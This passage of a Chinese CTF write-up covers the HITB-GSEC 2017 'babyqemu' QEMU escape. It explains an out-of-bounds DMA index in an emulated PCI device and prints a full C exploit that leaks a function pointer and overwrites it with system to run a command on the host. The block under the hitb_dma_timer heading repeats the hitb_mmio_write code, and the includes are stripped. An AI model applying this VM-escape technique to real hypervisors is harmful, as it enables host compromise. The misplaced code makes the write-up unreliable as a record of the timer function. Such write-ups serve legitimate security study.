  if ( (addr > 0x7F || size == 4) && (((size - 4) & 0xFFFFFFFB) == 0 || addr <= 0x7F) )
  {
    if ( addr == 128 )
    {
      if ( (opaque->dma.cmd & 1) == 0 )
        opaque->dma.src = val;
    }
    else
    {
      v4 = val;
      if ( addr > 128 )
      {
        if ( addr == 140 )
        {
          if ( (opaque->dma.cmd & 1) == 0 )
            *(&opaque->dma.dst + 4) = val;
        }
        else if ( addr > 140 )
        {
          if ( addr == 144 )
          {
            if ( (opaque->dma.cmd & 1) == 0 )
              opaque->dma.cnt = val;
          }
          else if ( addr == 152 && (val & 1) != 0 && (opaque->dma.cmd & 1) == 0 )
          {
            opaque->dma.cmd = val;
            ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL_0);
            timer_mod(&opaque->dma_timer, ns / 1000000 + 100);
          }
        }
        else if ( addr == 132 )
        {
          if ( (opaque->dma.cmd & 1) == 0 )
            *(&opaque->dma.src + 4) = val;
        }
        else if ( addr == 136 && (opaque->dma.cmd & 1) == 0 )
        {
          opaque->dma.dst = val;
        }
      }
      else if ( addr == 32 )
      {
        if ( (val & 0x80) != 0 )
          _InterlockedOr(&opaque->status, 0x80u);
        else
          _InterlockedAnd(&opaque->status, 0xFFFFFF7F);
      }
      else if ( addr > 0x20 )
      {
        if ( addr == 96 )
        {
          v6 = (val | opaque->irq_status) == 0;
          opaque->irq_status |= val;
          if ( !v6 )
            hitb_raise_irq(opaque, 0x60u);
        }
        else if ( addr == 100 )
        {
          v5 = ~val;
          v6 = (v5 & opaque->irq_status) == 0;
          opaque->irq_status &= v5;
          if ( v6 && !msi_enabled(&opaque->pdev) )
            pci_set_irq(&opaque->pdev, 0);
        }
      }
      else if ( addr == 4 )
      {
        opaque->addr4 = ~val;
      }
      else if ( addr == 8 && (opaque->status & 1) == 0 )
      {
        qemu_mutex_lock(&opaque->thr_mutex);
        opaque->fact = v4;
        _InterlockedOr(&opaque->status, 1u);
        qemu_cond_signal(&opaque->thr_cond);
        qemu_mutex_unlock(&opaque->thr_mutex);
      }
    }
  }
}

```

#### 3.hitb_dma_timer 函数

在 hitb_mmio_write 内调用了 timer_mod，qemu_clock_get_ns 获取时钟的纳秒值，timer_mod 修改 dma_timer 的 expire_time，这样应该可以触发 hitb_dma_timer 的调用

 

函数根据 cmd 来选择不同分支，cmd 最低位必须为 1；

1.  当 dma.cmd 为`2|1`时，会将`dma.src`减`0x40000`作为索引`i`，然后将数据从`dma_buf[i]`拷贝利用函数`cpu_physical_memory_rw`拷贝至物理地址`dma.dst`中，拷贝长度为`dma.cnt`。
2.  当 dma.cmd 为`4|2|1`时，会将`dma.dst`减`0x40000`作为索引`i`，然后将起始地址为`dma_buf[i]`，长度为`dma.cnt`的数据利用利用`opaque->enc`函数加密后，再调用函数`cpu_physical_memory_rw`拷贝至物理地址`opaque->dma.dst`中。
3.  当 dma.cmd 为`0|1`时，调用`cpu_physical_memory_rw`将物理地址中为`dma.dst`，长度为`dma.cnt`，拷贝到`dma.dst`减`0x40000`作为索引`i`，目标地址为`dma_buf[i]`的空间中。

```
void __fastcall hitb_mmio_write(HitbState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  uint32_t v4; // r13d
  int v5; // edx
  bool v6; // zf
  int64_t ns; // rax
 
  if ( (addr > 0x7F || size == 4) && (((size - 4) & 0xFFFFFFFB) == 0 || addr <= 0x7F) )
  {
    if ( addr == 128 )
    {
      if ( (opaque->dma.cmd & 1) == 0 )
        opaque->dma.src = val;
    }
    else
    {
      v4 = val;
      if ( addr > 128 )
      {
        if ( addr == 140 )
        {
          if ( (opaque->dma.cmd & 1) == 0 )
            *(&opaque->dma.dst + 4) = val;
        }
        else if ( addr > 140 )
        {
          if ( addr == 144 )
          {
            if ( (opaque->dma.cmd & 1) == 0 )
              opaque->dma.cnt = val;
          }
          else if ( addr == 152 && (val & 1) != 0 && (opaque->dma.cmd & 1) == 0 )
          {
            opaque->dma.cmd = val;
            ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL_0);
            timer_mod(&opaque->dma_timer, ns / 1000000 + 100);
          }
        }
        else if ( addr == 132 )
        {
          if ( (opaque->dma.cmd & 1) == 0 )
            *(&opaque->dma.src + 4) = val;
        }
        else if ( addr == 136 && (opaque->dma.cmd & 1) == 0 )
        {
          opaque->dma.dst = val;
        }
      }
      else if ( addr == 32 )
      {
        if ( (val & 0x80) != 0 )
          _InterlockedOr(&opaque->status, 0x80u);
        else
          _InterlockedAnd(&opaque->status, 0xFFFFFF7F);
      }
      else if ( addr > 0x20 )
      {
        if ( addr == 96 )
        {
          v6 = (val | opaque->irq_status) == 0;
          opaque->irq_status |= val;
          if ( !v6 )
            hitb_raise_irq(opaque, 0x60u);
        }
        else if ( addr == 100 )
        {
          v5 = ~val;
          v6 = (v5 & opaque->irq_status) == 0;
          opaque->irq_status &= v5;
          if ( v6 && !msi_enabled(&opaque->pdev) )
            pci_set_irq(&opaque->pdev, 0);
        }
      }
      else if ( addr == 4 )
      {
        opaque->addr4 = ~val;
      }
      else if ( addr == 8 && (opaque->status & 1) == 0 )
      {
        qemu_mutex_lock(&opaque->thr_mutex);
        opaque->fact = v4;
        _InterlockedOr(&opaque->status, 1u);
        qemu_cond_signal(&opaque->thr_cond);
        qemu_mutex_unlock(&opaque->thr_mutex);
      }
    }
  }
}

```

### 3. 漏洞

漏洞在 hitb_dma_timer 内的 cpu_physical_memory_rw 函数，dma_buf[] 内的索引可控，就造成可以越界读写；

 

翻看前面的结构体发现，可以越界读 enc 地址，进行泄露，再将计算出的 system@plt 写入 enc 内，将 "cat flag" 写入 dma.buf

```
#include #include #include #include #include #include #include #include #include #include #include #include #include #include #define MAP_SIZE 4096UL
#define MAP_MASK (MAP_SIZE - 1)
 
#define DMA_BASE 0x40000
 
 
#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)
 
char* pci_device_name = "/sys/devices/pci0000:00/0000:00:04.0/resource0";
 
unsigned char* tmpbuf;
uint64_t tmpbuf_phys_addr;
unsigned char* mmio_base;
 
unsigned char* getMMIOBase(){
 
    int fd;
    if((fd = open(pci_device_name, O_RDWR | O_SYNC)) == -1) {
        perror("open pci device");
        exit(-1);
    }
    mmio_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if(mmio_base == (void *) -1) {
        perror("mmap");
        exit(-1);
    }
    return mmio_base;
}
 
// 获取页内偏移
uint32_t page_offset(uint32_t addr)
{
    // addr & 0xfff
    return addr & ((1 << PAGE_SHIFT) - 1);
}
 
uint64_t gva_to_gfn(void *addr)
{
    uint64_t pme, gfn;
    size_t offset;
 
    int fd;
    fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        perror("open");
        exit(1);
    }
 
    // printf("pfn_item_offset : %p\n", (uintptr_t)addr >> 9);
    offset = ((uintptr_t)addr >> 9) & ~7;
 
    ////下面是网上其他人的代码，只是为了理解上面的代码
    //一开始除以 0x1000  （getpagesize=0x1000，4k对齐，而且本来低12位就是页内索引，需要去掉），即除以2**12, 这就获取了页号了，
    //pagemap中一个地址64位，即8字节，也即sizeof(uint64_t)，所以有了页号后，我们需要乘以8去找到对应的偏移从而获得对应的物理地址
    //最终  vir/2^12 * 8 = (vir / 2^9) & ~7
    //这跟上面的右移9正好对应，但是为什么要 & ~7 ,因为你  vir >> 12 << 3 , 跟vir >> 9 是有区别的，vir >> 12 << 3低3位肯定是0，所以通过& ~7将低3位置0
    // int page_size=getpagesize();
    // unsigned long vir_page_idx = vir/page_size;
    // unsigned long pfn_item_offset = vir_page_idx*sizeof(uint64_t);
 
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    // 确保页面存在——page is present.
    if (!(pme & PFN_PRESENT))
        return -1;
    // physical frame number
    gfn = pme & PFN_PFN;
    return gfn;
}
 
uint64_t gva_to_gpa(void *addr)
{
 
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}
 
void mmio_write(uint64_t addr, uint64_t value)
{
    *((uint64_t*)(mmio_base + addr)) = value;
}
 
uint64_t mmio_read(uint64_t addr)
{
    return *((uint64_t*)(mmio_base + addr));
}
 
void set_cnt(uint64_t val)
{
    mmio_write(144, val);
}
 
void set_src(uint64_t val)
{
    mmio_write(128, val);
}
 
void set_dst(uint64_t val)
{
    mmio_write(136, val);
}
 
void start_dma_timer(uint64_t val){
    mmio_write(152, val);
}
 
void dma_read(uint64_t offset, uint64_t  cnt){
 
    // 设置dma_buf的索引
    set_src(DMA_BASE + offset);
    // 设置读取后要写入的物理地址
    set_dst(tmpbuf_phys_addr);
    // 设置读取的大小
    set_cnt(cnt);
    // 触发hitb_dma_timer
    start_dma_timer(1|2);
    // 等待上面的执行完
    sleep(1);
}
 
void dma_write(uint64_t offset, char* buf, uint64_t  cnt)
{
    // 将我们要写的内容先复制到tmpbuf
    memcpy(tmpbuf, buf, cnt);
    //设置物理地址（要从这读取写到dma_buf[opaque->dma.dst-0x40000]）
    set_src(tmpbuf_phys_addr);
    // 设置dma_buf的索引
    set_dst(DMA_BASE + offset);
    // 设置写入大小
    set_cnt(cnt);
    // 触发hitb_dma_timer
    start_dma_timer(1);
    // 等待上面的执行完
    sleep(1);
}
 
void dma_write_qword(uint64_t offset, uint64_t val)
{
    dma_write(offset, (char *)&val, 8);
}
 
void dma_enc_read(uint64_t offset, uint64_t  cnt)
{
    // 设置dma_buf的索引
    set_src(DMA_BASE + offset);
    // 设置读取后要写入的物理地址
    set_dst(tmpbuf_phys_addr);
    // 设置读取的大小
    set_cnt(cnt);
    // 触发hitb_dma_timer
    start_dma_timer(1|2|4);
    // 等待上面的执行完
    sleep(1);
}
 
int main(int argc, char const *argv[])
{
    getMMIOBase();
    printf("mmio_base Resource0Base: %p\n", mmio_base);
 
    tmpbuf = malloc(0x1000);
    tmpbuf_phys_addr = gva_to_gpa(tmpbuf);
    printf("gva_to_gpa tmpbuf_phys_addr %p\n", (void*)tmpbuf_phys_addr);
 
 
    printf("tmpbuf: %p\n", tmpbuf);
    printf("&tmpbuf: %p\n", &tmpbuf);
 
    // 将enc函数指针写到tmpbuf_phys_addr,之后通过tmpbuf读出即可
    dma_read(4096, 8);
    uint64_t hitb_enc_addr = *((uint64_t*)tmpbuf);
    uint64_t binary_base_addr = hitb_enc_addr - 0x283DD0;
    uint64_t system_addr = binary_base_addr + 0x1FDB18;
    printf("hitb_enc_addr: 0x%lx\n", hitb_enc_addr);
    printf("binary_base_addr: 0x%lx\n", binary_base_addr);
    printf("system_addr: 0x%lx\n", system_addr);
 
    // 覆盖enc函数指针为system地址
    dma_write_qword(4096, system_addr);
    char* command = "cat flag";
    dma_write(0x200, command, strlen(command));
 
    // 触发hitb_dma_timer中的enc函数,从而调用syetem
    dma_enc_read(0x200, 666);
 
    return 0;
} 
```

参考链接:

 

https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/

 

https://www.anquanke.com/post/id/254906#h3-5

 

https://www.giantbranch.cn/2019/07/17/VM%20escape%20%E4%B9%8B%20QEMU%20Case%20Study/

 

https://www.giantbranch.cn/2020/01/02/CTF%20QEMU%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E4%B9%8BHITB-GSEC-2017-babyqemu/

[看雪招聘平台创建简历并且简历完整度达到 90% 及以上可获得 500 看雪币～](https://job.kanxue.com/position-list.htm)

[#基础知识](forum-171-1-180.htm) [#漏洞机制](forum-171-1-181.htm) [#溢出](forum-171-1-182.htm) [#专题](forum-171-1-186.htm)